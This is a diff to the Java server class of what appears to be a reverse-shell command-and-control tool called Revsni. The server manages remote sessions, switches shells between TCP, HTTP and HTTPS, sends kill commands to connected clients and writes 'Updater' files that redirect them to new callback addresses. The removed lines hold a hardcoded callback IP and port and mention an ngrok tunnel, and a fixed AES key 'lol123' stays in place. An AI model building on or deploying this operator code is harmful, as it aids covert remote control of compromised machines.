@@ -89,9 +89,9 @@ public class Server implements Runnable{
     //public static AES initEncri = new AES("lol123", "lol123");
     //public static RSA initEncri = new RSA();
 
-    public static AES initEncri = new AES("lol123", "lol123");
+    public static Encri initEncri = new AES("lol123", "lol123");
 
-    private Configuration configuration;
+    public static Configuration configserv;
 
 
     Logger logger = LogManager.getLogger(getClass());
@@ -99,12 +99,15 @@ public class Server implements Runnable{
 
 
 
-    public Server(String ip, int port, String pass, String salt, ThreadMonitor monitor, int sessionNumber, boolean loaded, Configuration configuration) throws NoSuchAlgorithmException, InvalidKeySpecException, IOException {
+    public Server(String pass, String salt, ThreadMonitor monitor, int sessionNumber, boolean loaded, Configuration configuration) throws NoSuchAlgorithmException, InvalidKeySpecException, IOException {
         this.sessionNumber = sessionNumber;
         this.sessionNumberStart = sessionNumber;
-        this.configuration = configuration;
+        configserv = configuration;
         
         this.threadMonitor = monitor;
+
+        String ip = configuration.getMode().lHost;
+        int port = configuration.getMode().lPort;
 
         if(!loaded) {
             initServer(ip, port, pass, salt);
@@ -112,21 +115,15 @@ public class Server implements Runnable{
             first = false;
         }
         
-
-
     }
 
     public boolean initServer(String ip, int port, String password, String saltForPass) {
-        //setMode(sessionNumber, Mode.TCP);
         this.port = port;
-        //this.ip = ip;
-        //this.pass = password;
-        //this.salt = saltForPass;
-        //tcp://2.tcp.ngrok.io:18816
-        updater = new Updater("13.59.15.185", 18816, initEncri);
+
+        updater = new Updater(ip, port, initEncri, configserv);
 
         try {
-            updater.generateOutputString(configuration.getEncMode());
+            updater.generateOutputString(configserv.getEncMode());
             if(updater.writeOut("initialRSA")) {
                 logger.debug("File initialRSA wrote!");
                 return true;
@@ -173,11 +170,19 @@ public class Server implements Runnable{
                                 printIn();
                                 String tmp = bufferedReader.readLine();
                                 switch(tmp) {
+                                    case("tcp"):
+                                        System.out.print("Specify a Port on which TCP Listener should listen on (empty for std server port ("+Configuration.localPortTCP+")): ");
+                                        String port = bufferedReader.readLine();
+                                        //logger.info("Value: " + port);
+                                        //logger.info("Value 1331: " + String.valueOf(Configuration.localPortTCP));
+                                        switchTCP(port);
+                                        break;
+
                                     case("http"): 
                                         System.out.print("Specify a Port on which HTTP-Server should listen on: ");
-                                        int port = Integer.parseInt(bufferedReader.readLine());
-                                        httpShell = new HTTPShell(port, sessionNumber, protocol);
-                                        updater.setShellType("HTTP", String.valueOf(httpShell.getPort()));
+                                        int portHttp = Integer.parseInt(bufferedReader.readLine());
+                                        httpShell = new HTTPShell(portHttp, sessionNumber, protocol);
+                                        updater.setShellType("HTTP", getIp(sessionNumber), String.valueOf(httpShell.getPort()));
                                         updater.generateOutputString(clientEnc.get(sessionNumber).getEncryption());
                                         updater.writeOut(getUUID(sessionNumber));
                                         senderino("httpSw", sessionNumber);
@@ -191,7 +196,7 @@ public class Server implements Runnable{
                                         int portIn = Integer.parseInt(bufferedReader.readLine());
                                         httpsShell = new HTTPSShell(key, iv, portIn);
                                         httpsShell.fireUp(portIn);
-                                        updater.setShellType("HTTPS", String.valueOf(getInteraction(sessionNumber).getPort()));
+                                        updater.setShellType("HTTPS", getIp(sessionNumber), String.valueOf(getInteraction(sessionNumber).getPort()));
                                         updater.generateOutputString(clientEnc.get(sessionNumber).getEncryption());
                                         updater.writeOut(getUUID(sessionNumber));
                                         senderino("httpsSw", sessionNumber);;
@@ -206,7 +211,7 @@ public class Server implements Runnable{
                             case("mode"): printMode(); break;
                             case("kill"): if(sessionNumber == 0) { break; } getInteraction(sessionNumber).sendCommand("kill"); getInteraction(sessionNumber).sendCommand("exit"); break;
                             case("remove"): removeSession(sessionNumber); sessionNumber = 0; break;
-                            case("exit"): Revsni.setActive(false); return;
+                            case("exit"): closeRoutine(); return;
                             case("encryption"): printEncryption(); break;
                             case("bg"):
                                 Revsni.setActiveHelper(true); 
@@ -253,22 +258,14 @@ public class Server implements Runnable{
                             }
                     } catch(IOException e) {
                         logger.error(e.getMessage() +": occured in Server main Thread!");
-                        setRunning(false);
-                        listener.stopListening();
-                        Revsni.setActive(false);
-                        Revsni.setServerError();
-                        Revsni.setActiveHelper(true);
+                        closeRoutine();
                         return;
                     }
                 } while(!message.equals("quit"));
                 logger.info("lul");
             } finally {
                 logger.info("Server is shutting down");
-                setRunning(false);
-                listener.stopListening();
-                Revsni.setActive(false);
-                Revsni.setServerError();
-                Revsni.setActiveHelper(true);
+                closeRoutine();
             }
             return;
         }
@@ -296,6 +293,15 @@ public class Server implements Runnable{
             }
         }
     }
+
+    public void closeRoutine() {
+        listener.stopListening();
+        setRunning(false);
+        Revsni.setActive(false); 
+        Revsni.setServerError();
+        Revsni.setActiveHelper(true); 
+    }
+
     public void send(int sessionNumber, String message, String uuid) {
         if(checkIfOnline(sessionNumber)) {
             getInteraction(sessionNumber).sendCommand(message, uuid);
@@ -380,6 +386,20 @@ public class Server implements Runnable{
         //Implement applying config to TCP, HTTP, HTTPS and stuff.
     }
 
+    public void switchTCP(String port) {
+        if(port.equals("")) { port = String.valueOf(Configuration.localPortTCP); }
+        updater.setShellType(Mode.TCP.name(), Configuration.localAddrTCP, port);
+        try {
+            updater.generateOutputString(clientEnc.get(sessionNumber).getEncryption());
+            updater.writeOut(getUUID(sessionNumber));
+        } catch (IOException e) {
+            logger.error("Failed to write Updater file!");
+        }
+        senderino("tcpSw", sessionNumber);
+        logger.info("Switch done!");
+    }
+
+
 
     //Session handling
 
@@ -393,12 +413,13 @@ public class Server implements Runnable{
     public void addSession(String ip, int port, Interaction handler, int sessionNumber ) {
         sessionHandlers.put(sessionNumber, handler);
         sessIpSt.put(sessionNumber, ip);
-        setNewEncryption(configuration.getEncMode(), sessionNumber);
+        setNewEncryption(configserv.getEncMode(), sessionNumber);
         
         //handlerinos.put(sessionNumber, handler);
     }
 
     public void removeSession(int sessionNumber) {
+        updateSessionInfo();
         sessionHandlers.remove(sessionNumber);
         modePortUUID.remove(sessionNumber);
         ipOs.remove(sessionNumber);
@@ -452,6 +473,7 @@ public class Server implements Runnable{
 
         ipOs.put(sessNr, new CouplePair<String,String>(tmpIp, tmpOs));
         modePortUUID.put(sessNr, new Triplet<Mode, Integer, String>(tmpMode, tmpPort, tmpUUID));
+        updateSessionInfo();
         printIn();
     }
 
@@ -561,6 +583,30 @@ public class Server implements Runnable{
         }
     }
 
+    public void updateSessionInfo() {
+        int count = 0;
+        for(String uuid : sessNumUUID.values()) {
+            for(String uuid2 : sessNumUUID.values()) {
+                if(uuid.equals(uuid2)) {
+                    count++;
+                    if(count > 2) {
+                        int sessNum = getKeyByValue(sessNumUUID, uuid);
+                        try {
+                            if(getInteraction(sessNum) instanceof HTTPShell) {
+                                getInteraction(sessNum).shutdown();
+                            }
+                            logger.info("Duplicate session + " + uuid + " removed.");
+                        } catch (Exception e) {
+                            logger.error("Failed to shutdown listening instance for session nr. " + sessNum + "\n");
+                        }
+                        removeSession(sessNum); 
+                    }
+                }
+            }
+            count = 0;
+        }
+    }
+
     public void setNewEncryption(EncMode mode, int sessionNumber) {
         switch(mode) {
             case AES:
@@ -603,7 +649,7 @@ public class Server implements Runnable{
 
         /* AES */
         try {
-            updater.generateOutputString(configuration.getEncMode());
+            updater.generateOutputString(configserv.getEncMode());
             updater.writeOut(uuid);
         } catch (IOException e) {
             e.printStackTrace();
@@ -625,6 +671,10 @@ public class Server implements Runnable{
 
     public void setProtocol(Protocol prot) {
         this.protocol = prot;
+    }
+
+    public Configuration getConfiguration() {
+        return configserv;
     }
 
 
@@ -676,6 +726,7 @@ public class Server implements Runnable{
                           +"|Shell Menu|"
                           +"-----------"
                           +"\n"
+                          +"tcp         -   Change to TCP Shell\n"
                           +"udp         -   Change to UDP Shell\n"
                           +"http        -   Change to HTTP Shell\n"
                           +"https       -   Change to HTTPS Shell\n"
